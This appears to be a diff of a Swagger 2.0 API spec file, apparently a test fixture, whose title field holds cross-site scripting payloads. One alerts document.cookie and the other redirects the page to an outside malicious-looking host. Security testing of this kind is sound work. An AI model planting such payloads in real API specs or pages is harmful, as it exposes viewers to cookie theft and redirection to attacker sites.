@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   version: "1.0.0"
-  title: "<script>alert(document.cookie)</script>"
+  title: "<script>window.location='https://site-malicioso.com'</script>"
 paths:
   /:
     get:
